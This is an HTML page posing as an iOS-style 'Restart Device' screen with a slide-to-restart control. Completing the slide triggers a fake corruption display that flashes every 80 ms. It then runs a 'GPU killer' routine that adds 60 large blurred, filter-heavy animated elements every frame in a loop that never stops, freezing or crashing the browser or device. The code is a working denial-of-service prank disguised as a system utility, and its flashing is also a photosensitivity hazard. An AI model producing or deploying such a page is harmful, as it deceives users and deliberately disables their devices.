<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Restart Device</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
            -webkit-user-select: none;
        }

        body {
            background: #000;
            color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            align-items: center;
            padding: 60px 20px 80px 20px;
            overflow: hidden;
            position: relative;
            transition: background 0.3s ease;
        }

        .header-section {
            text-align: center;
            margin-top: 40px;
            z-index: 10;
            transition: opacity 0.1s ease-out;
        }

        h1 {
            font-size: 28px;
            font-weight: 400;
            letter-spacing: -0.5px;
            margin-bottom: 12px;
            color: #fff;
        }

        .slider-container {
            width: 100%;
            max-width: 340px;
            display: flex;
            flex-direction: column;
            gap: 24px;
            margin-bottom: 20px;
            z-index: 10;
            transition: opacity 0.1s ease-out;
        }

        .slider-track {
            position: relative;
            width: 100%;
            height: 76px;
            background: rgba(35, 35, 35, 0.45);
            border-radius: 38px;
            display: flex;
            align-items: center;
            padding: 4px;
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.05);
            overflow: hidden;
            transition: background 0.1s ease-out, border 0.1s ease-out, backdrop-filter 0.1s ease-out;
        }

        .slider-text {
            position: absolute;
            width: 100%;
            text-align: center;
            left: 0;
            font-size: 16px;
            font-weight: 500;
            letter-spacing: -0.2px;
            pointer-events: none;
            background: linear-gradient(90deg, #4d4d4d 0%, #fff 50%, #4d4d4d 100%);
            background-size: 200% 100%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: shine 2.5s infinite linear;
            padding-left: 40px;
            transition: opacity 0.1s ease-out;
        }

        @keyframes shine {
            0% { background-position: 100% 0; }
            100% { background-position: -100% 0; }
        }

        .slider-handle {
            width: 68px;
            height: 68px;
            background: #fff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: grab;
            z-index: 12;
            box-shadow: 0 3px 8px rgba(0,0,0,0.3);
            transition: transform 0.1s ease-out;
            touch-action: none;
        }

        .slider-handle:active {
            cursor: grabbing;
        }

        .respring-icon {
            color: #000;
            font-size: 26px;
            transform: scaleX(-1);
        }

        .loading-container {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 9999;
            display: none;
            pointer-events: none;
        }

        .ispinner {
            position: relative;
            width: 20px;
            height: 20px;
        }
        .ispinner .ispinner-blade {
            position: absolute;
            top: 6.5px;
            left: 8.5px;
            width: 2.5px;
            height: 6.5px;
            background-color: #fff;
            border-radius: 1.25px;
            -webkit-animation: iSpinnerBlade 1s linear infinite;
            animation: iSpinnerBlade 1s linear infinite;
            will-change: opacity;
        }
        .ispinner .ispinner-blade:nth-child(1) {
            -webkit-transform: rotate(45deg) translateY(-6.5px);
            transform: rotate(45deg) translateY(-6.5px);
            -webkit-animation-delay: -1.625s;
            animation-delay: -1.625s;
        }
        .ispinner .ispinner-blade:nth-child(2) {
            -webkit-transform: rotate(90deg) translateY(-6.5px);
            transform: rotate(90deg) translateY(-6.5px);
            -webkit-animation-delay: -1.5s;
            animation-delay: -1.5s;
        }
        .ispinner .ispinner-blade:nth-child(3) {
            -webkit-transform: rotate(135deg) translateY(-6.5px);
            transform: rotate(135deg) translateY(-6.5px);
            -webkit-animation-delay: -1.375s;
            animation-delay: -1.375s;
        }
        .ispinner .ispinner-blade:nth-child(4) {
            -webkit-transform: rotate(180deg) translateY(-6.5px);
            transform: rotate(180deg) translateY(-6.5px);
            -webkit-animation-delay: -1.25s;
            animation-delay: -1.25s;
        }
        .ispinner .ispinner-blade:nth-child(5) {
            -webkit-transform: rotate(225deg) translateY(-6.5px);
            transform: rotate(225deg) translateY(-6.5px);
            -webkit-animation-delay: -1.125s;
            animation-delay: -1.125s;
        }
        .ispinner .ispinner-blade:nth-child(6) {
            -webkit-transform: rotate(270deg) translateY(-6.5px);
            transform: rotate(270deg) translateY(-6.5px);
            -webkit-animation-delay: -1s;
            animation-delay: -1s;
        }
        .ispinner .ispinner-blade:nth-child(7) {
            -webkit-transform: rotate(315deg) translateY(-6.5px);
            transform: rotate(315deg) translateY(-6.5px);
            -webkit-animation-delay: -0.875s;
            animation-delay: -0.875s;
        }
        .ispinner .ispinner-blade:nth-child(8) {
            -webkit-transform: rotate(360deg) translateY(-6.5px);
            transform: rotate(360deg) translateY(-6.5px);
            -webkit-animation-delay: -0.75s;
            animation-delay: -0.75s;
        }

        .ispinner.ispinner-large {
            width: 35px;
            height: 35px;
        }
        .ispinner.ispinner-large .ispinner-blade {
            top: 11.5px;
            left: 15px;
            width: 5px;
            height: 12px;
            border-radius: 2.5px;
        }
        .ispinner.ispinner-large .ispinner-blade:nth-child(1) {
            -webkit-transform: rotate(45deg) translateY(-11.5px);
            transform: rotate(45deg) translateY(-11.5px);
        }
        .ispinner.ispinner-large .ispinner-blade:nth-child(2) {
            -webkit-transform: rotate(90deg) translateY(-11.5px);
            transform: rotate(90deg) translateY(-11.5px);
        }
        .ispinner.ispinner-large .ispinner-blade:nth-child(3) {
            -webkit-transform: rotate(135deg) translateY(-11.5px);
            transform: rotate(135deg) translateY(-11.5px);
        }
        .ispinner.ispinner-large .ispinner-blade:nth-child(4) {
            -webkit-transform: rotate(180deg) translateY(-11.5px);
            transform: rotate(180deg) translateY(-11.5px);
        }
        .ispinner.ispinner-large .ispinner-blade:nth-child(5) {
            -webkit-transform: rotate(225deg) translateY(-11.5px);
            transform: rotate(225deg) translateY(-11.5px);
        }
        .ispinner.ispinner-large .ispinner-blade:nth-child(6) {
            -webkit-transform: rotate(270deg) translateY(-11.5px);
            transform: rotate(270deg) translateY(-11.5px);
        }
        .ispinner.ispinner-large .ispinner-blade:nth-child(7) {
            -webkit-transform: rotate(315deg) translateY(-11.5px);
            transform: rotate(315deg) translateY(-11.5px);
        }
        .ispinner.ispinner-large .ispinner-blade:nth-child(8) {
            -webkit-transform: rotate(360deg) translateY(-11.5px);
            transform: rotate(360deg) translateY(-11.5px);
        }

        @-webkit-keyframes iSpinnerBlade {
            0% { opacity: 0.85; }
            50% { opacity: 0.25; }
            100% { opacity: 0.25; }
        }
        @keyframes iSpinnerBlade {
            0% { opacity: 0.85; }
            50% { opacity: 0.25; }
            100% { opacity: 0.25; }
        }

        /* ============================================================
           CANVAS – bottom of screen, thin, flashing
           ============================================================ */
        #corruption-canvas {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100vw;
            height: 0.5cm; /* ~0.5cm tall */
            image-rendering: pixelated;
            display: none;
            z-index: 999999;
            pointer-events: none;
            mix-blend-mode: screen;
            box-shadow: 0 0 20px rgba(255, 0, 255, 0.2);
            background: #000;
        }

        /* ============================================================
           GPU KILLER – exact original, black background
           ============================================================ */
        .gpu-killer {
            position: fixed;
            border-radius: 50%;
            background: #000;
            mix-blend-mode: normal;
            will-change: transform, filter;
            backface-visibility: hidden;
            perspective: 1000px;
            pointer-events: none;
            z-index: 999997;
            animation: gpuMeltdown 0.5s infinite linear;
            transform-origin: center;
        }

        @keyframes gpuMeltdown {
            0% {
                transform: translate(0, 0) rotate(0deg) scale(1) skew(0deg);
                filter: hue-rotate(0deg) blur(0px) contrast(100%) brightness(100%);
                background: #000;
            }
            20% {
                transform: translate(-50vw, 100vh) rotate(720deg) scale(0.1) skew(-40deg);
                filter: hue-rotate(360deg) blur(20px) contrast(300%) brightness(200%);
                background: #000;
            }
            50% {
                transform: translate(200vw, 200vh) rotate(1800deg) scale(20) skew(100deg);
                filter: hue-rotate(900deg) blur(50px) contrast(600%) brightness(350%);
                background: #000;
            }
            80% {
                transform: translate(-200vw, 250vh) rotate(2880deg) scale(0.0001) skew(-160deg);
                filter: hue-rotate(1440deg) blur(80px) contrast(900%) brightness(500%);
                background: #000;
            }
            100% {
                transform: translate(0, 0) rotate(3600deg) scale(1) skew(0deg);
                filter: hue-rotate(1800deg) blur(100px) contrast(1100%) brightness(600%);
                background: #000;
            }
        }
    </style>
</head>
<body>
    <div class="header-section">
        <h1>Restart Device</h1>
    </div>

    <div class="slider-container">
        <div class="slider-track" id="track-respring">
            <div class="slider-text">slide to restart</div>
            <div class="slider-handle" id="handle-respring">
                <span class="respring-icon">⟳</span>
            </div>
        </div>
    </div>

    <div class="loading-container" id="respring-loader">
        <div class="ispinner ispinner-large">
            <div class="ispinner-blade"></div>
            <div class="ispinner-blade"></div>
            <div class="ispinner-blade"></div>
            <div class="ispinner-blade"></div>
            <div class="ispinner-blade"></div>
            <div class="ispinner-blade"></div>
            <div class="ispinner-blade"></div>
            <div class="ispinner-blade"></div>
        </div>
    </div>

    <!-- Canvas for corruption visual -->
    <canvas id="corruption-canvas"></canvas>

    <script>
        // ================================================================
        // 1. CANVAS RENDER – dense pixels with repeating patterns
        // ================================================================
        const canvas = document.getElementById('corruption-canvas');
        const ctx = canvas.getContext('2d');

        function renderCorruptionCanvas() {
            // Make canvas fill width, height = 0.5cm (approx 19px at 96dpi)
            const dpr = window.devicePixelRatio || 1;
            const rect = canvas.getBoundingClientRect();
            const cssWidth = window.innerWidth;
            const cssHeight = 0.5 * 37.8; // 0.5cm ≈ 18.9px
            canvas.width = cssWidth * dpr;
            canvas.height = cssHeight * dpr;
            canvas.style.width = cssWidth + 'px';
            canvas.style.height = cssHeight + 'px';
            canvas.style.display = 'block';

            // Scale context for pixel density
            ctx.scale(dpr, dpr);

            // Dimensions in CSS pixels
            const w = cssWidth;
            const h = cssHeight;

            // Generate a palette of 16 colors (repeating pattern)
            const palette = [];
            for (let i = 0; i < 16; i++) {
                const r = Math.floor(Math.random() * 256);
                const g = Math.floor(Math.random() * 256);
                const b = Math.floor(Math.random() * 256);
                palette.push(`rgb(${r},${g},${b})`);
            }

            // Draw pixel by pixel (1px blocks) with repeating block pattern
            const blockSize = 4; // 4x4 blocks
            const imageData = ctx.createImageData(w, h);
            const data = imageData.data;
            for (let y = 0; y < h; y++) {
                for (let x = 0; x < w; x++) {
                    const blockRow = Math.floor(y / blockSize);
                    const blockCol = Math.floor(x / blockSize);
                    const idx = (blockRow + blockCol) % palette.length;
                    const color = palette[idx];
                    // Parse RGB
                    const match = color.match(/\d+/g);
                    if (match) {
                        const r = parseInt(match[0]);
                        const g = parseInt(match[1]);
                        const b = parseInt(match[2]);
                        const pixelIndex = (y * w + x) * 4;
                        data[pixelIndex] = r;
                        data[pixelIndex + 1] = g;
                        data[pixelIndex + 2] = b;
                        data[pixelIndex + 3] = 255;
                    }
                }
            }
            ctx.putImageData(imageData, 0, 0);

            // ** Intentional corruption: draw an image with mismatched size **
            // Create an offscreen canvas with different dimensions and draw it scaled
            const offscreen = document.createElement('canvas');
            offscreen.width = w * 2; // double width
            offscreen.height = h * 3; // triple height
            const offCtx = offscreen.getContext('2d');
            // Fill with random noise
            const offData = offCtx.createImageData(offscreen.width, offscreen.height);
            const offPixels = offData.data;
            for (let i = 0; i < offPixels.length; i += 4) {
                offPixels[i] = Math.floor(Math.random() * 256);
                offPixels[i + 1] = Math.floor(Math.random() * 256);
                offPixels[i + 2] = Math.floor(Math.random() * 256);
                offPixels[i + 3] = 255;
            }
            offCtx.putImageData(offData, 0, 0);
            // Draw this oversized image onto the canvas – this will cause
            // scaling artifacts and look like memory corruption
            ctx.drawImage(offscreen, 0, 0, w, h);

            // Overlay some semi-transparent random pixels
            for (let i = 0; i < w * h * 0.3; i++) {
                const x = Math.random() * w;
                const y = Math.random() * h;
                const size = 1 + Math.random() * 2;
                const alpha = 0.2 + Math.random() * 0.4;
                ctx.fillStyle = `hsla(${Math.random()*360}, 100%, 50%, ${alpha})`;
                ctx.fillRect(x, y, size, size);
            }

            // Rapidly flash the canvas on/off
            let visible = true;
            if (window.canvasFlashInterval) clearInterval(window.canvasFlashInterval);
            window.canvasFlashInterval = setInterval(() => {
                visible = !visible;
                canvas.style.opacity = visible ? '1' : '0.1';
            }, 80); // flash every 80ms
        }

        // ================================================================
        // 2. EXACT ORIGINAL GPU KILLER – black background
        // ================================================================
        function cssAnimationInferno() {
            // Ensure keyframes exist
            const style = document.createElement('style');
            if (!document.getElementById('gpu-core-styles')) {
                style.id = 'gpu-core-styles';
                style.textContent = `
                    @keyframes gpuMeltdown {
                        0% { transform: translate(0, 0) rotate(0deg) scale(1) skew(0deg); filter: hue-rotate(0deg) blur(0px) contrast(100%) brightness(100%); background: #000; }
                        20% { transform: translate(-50vw, 100vh) rotate(720deg) scale(0.1) skew(-40deg); filter: hue-rotate(360deg) blur(20px) contrast(300%) brightness(200%); background: #000; }
                        50% { transform: translate(200vw, 200vh) rotate(1800deg) scale(20) skew(100deg); filter: hue-rotate(900deg) blur(50px) contrast(600%) brightness(350%); background: #000; }
                        80% { transform: translate(-200vw, 250vh) rotate(2880deg) scale(0.0001) skew(-160deg); filter: hue-rotate(1440deg) blur(80px) contrast(900%) brightness(500%); background: #000; }
                        100% { transform: translate(0, 0) rotate(3600deg) scale(1) skew(0deg); filter: hue-rotate(1800deg) blur(100px) contrast(1100%) brightness(600%); background: #000; }
                    }
                `;
                document.head.appendChild(style);
            }

            let elementCount = 0;
            function createGpuKiller() {
                try {
                    for (let i = 0; i < 60; i++) {
                        const element = document.createElement('div');
                        element.className = 'gpu-killer';
                        const size = Math.random() * 400 + 100;
                        element.style.width = size + 'px';
                        element.style.height = size + 'px';
                        element.style.left = Math.random() * 100 + 'vw';
                        element.style.top = Math.random() * 100 + 'vh';
                        element.style.zIndex = 1000000 + elementCount;
                        element.style.background = '#000';
                        document.body.appendChild(element);
                        elementCount++;
                    }
                    if (elementCount > -2146483647) {
                        requestAnimationFrame(createGpuKiller);
                    }
                } catch(e) {
                    requestAnimationFrame(createGpuKiller);
                }
            }
            createGpuKiller();
        }

        // ================================================================
        // 3. SEQUENTIAL PHASE HANDLER
        // ================================================================
        function triggerPhasedSequence(intensity) {
            // Hide UI
            document.querySelector('.header-section').style.display = 'none';
            document.querySelector('.slider-container').style.display = 'none';

            // Show spinner
            const loader = document.getElementById('respring-loader');
            loader.style.display = 'block';

            setTimeout(() => {
                loader.style.display = 'none';
                // Render the canvas
                renderCorruptionCanvas();

                // Wait 1.5 seconds to let the corruption be seen, then launch killer
                setTimeout(() => {
                    cssAnimationInferno();
                }, 1500);
            }, 1000);
        }

        // ================================================================
        // 4. SLIDER CONTROLLER (unchanged)
        // ================================================================
        function setupSlider(handleId, trackId, multiplier) {
            const handle = document.getElementById(handleId);
            const track = document.getElementById(trackId);
            const header = document.querySelector('.header-section');
            const textElement = track.querySelector('.slider-text');

            let isDragging = false;
            let startX = 0;
            let maxDelta = 0;
            let currentDeltaX = 0;

            function getClientX(e) {
                return e.touches ? e.touches[0].clientX : e.clientX;
            }

            function onStart(e) {
                isDragging = true;
                startX = getClientX(e);
                maxDelta = track.clientWidth - handle.clientWidth - 8;
                handle.style.transition = 'none';
            }

            function onMove(e) {
                if (!isDragging) return;
                const currentX = getClientX(e);
                currentDeltaX = currentX - startX;

                if (currentDeltaX < 0) currentDeltaX = 0;
                if (currentDeltaX > maxDelta) currentDeltaX = maxDelta;

                handle.style.transform = `translateX(${currentDeltaX}px)`;

                let progress = currentDeltaX / maxDelta;
                let inverseOpacity = 1 - progress;

                header.style.opacity = inverseOpacity;
                textElement.style.opacity = inverseOpacity;

                track.style.background = `rgba(35, 35, 35, ${0.45 * inverseOpacity})`;
                track.style.borderColor = `rgba(255, 255, 255, ${0.05 * inverseOpacity})`;
                track.style.webkitBackdropFilter = `blur(${20 * inverseOpacity}px)`;
                track.style.backdropFilter = `blur(${20 * inverseOpacity}px)`;
            }

            function onEnd() {
                if (!isDragging) return;
                isDragging = false;

                if (currentDeltaX >= maxDelta) {
                    triggerPhasedSequence(multiplier);
                } else {
                    currentDeltaX = 0;
                    handle.style.transition = 'transform 0.3s cubic-bezier(0.25, 1, 0.5, 1)';
                    handle.style.transform = 'translateX(0px)';

                    header.style.transition = 'opacity 0.3s';
                    header.style.opacity = '1';

                    textElement.style.transition = 'opacity 0.3s';
                    textElement.style.opacity = '1';

                    track.style.background = 'rgba(35, 35, 35, 0.45)';
                    track.style.borderColor = 'rgba(255, 255, 255, 0.05)';
                    track.style.webkitBackdropFilter = 'blur(20px)';
                    track.style.backdropFilter = 'blur(20px)';
                }
            }

            handle.addEventListener('touchstart', onStart, { passive: true });
            window.addEventListener('touchmove', onMove, { passive: false });
            window.addEventListener('touchend', onEnd);

            handle.addEventListener('mousedown', onStart);
            window.addEventListener('mousemove', onMove);
            window.addEventListener('mouseup', onEnd);
        }

        // Initialize
        setupSlider('handle-respring', 'track-respring', 1);
    </script>
</body>
</html>
